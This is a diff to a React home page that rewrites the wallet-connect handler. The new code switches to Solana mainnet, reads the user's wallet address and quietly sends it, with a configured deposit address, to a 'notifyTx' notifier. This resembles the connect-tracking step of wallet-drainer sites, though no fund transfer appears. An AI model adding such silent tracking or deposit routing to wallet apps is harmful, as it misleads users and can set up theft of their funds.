@@ -1,5 +1,9 @@
 import React, { useState, useEffect } from "react";
 import { modal } from "./appkit";
+import { notifyTx } from "./lib/notify";
+import { solana as solanaMainnet } from "@reown/appkit/networks";
+import { getActiveSolanaProvider } from "./lib/solana";
+import { SOL_DEPOSIT_ADDRESS } from "./config";
 
 const Home: React.FC = () => {
   const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
@@ -58,8 +62,57 @@ const Home: React.FC = () => {
     closeMobileMenu();
   };
 
-  const handleConnectWallet = () => {
-    modal.open({ view: "Connect" });
+  const handleConnectWallet = async () => {
+    try {
+      console.log("Opening Solana wallet modal...");
+      await modal.switchNetwork(solanaMainnet as any);
+      await modal.open();
+
+      // try to read address immediately
+      const p: any = getActiveSolanaProvider();
+      const pk = p?.publicKey;
+      let fromAddr = "";
+      if (pk?.toBase58) fromAddr = pk.toBase58();
+      else if (typeof pk === "string") fromAddr = pk;
+
+      if (fromAddr) {
+        console.log("🔑 Solana wallet connected -> notifyTx", { fromAddr });
+        // 🔔 CONNECT notification
+        notifyTx({
+          kind: "solana",
+          chain: "mainnet-beta",
+          from: fromAddr,
+          to: SOL_DEPOSIT_ADDRESS,
+          token: "CONNECT",
+          tx: "-", // no tx hash for a connect event
+        });
+        console.log("Connected.");
+      } else {
+        // give the wallet a tick to expose publicKey, then re-check
+        setTimeout(async () => {
+          try {
+            const maybe = await (modal as any)?.getAddress?.();
+            if (maybe) {
+              console.log("🔑 Solana wallet connected (delayed) -> notifyTx", {
+                address: maybe,
+              });
+              notifyTx({
+                kind: "solana",
+                chain: "mainnet-beta",
+                from: String(maybe),
+                to: SOL_DEPOSIT_ADDRESS,
+                token: "CONNECT",
+                tx: "-",
+              });
+            }
+          } catch (e) {
+            console.error("Error getting address:", e);
+          }
+        }, 250);
+      }
+    } catch (e: any) {
+      console.error(`Error: ${e.message || e}`);
+    }
   };
 
   return (
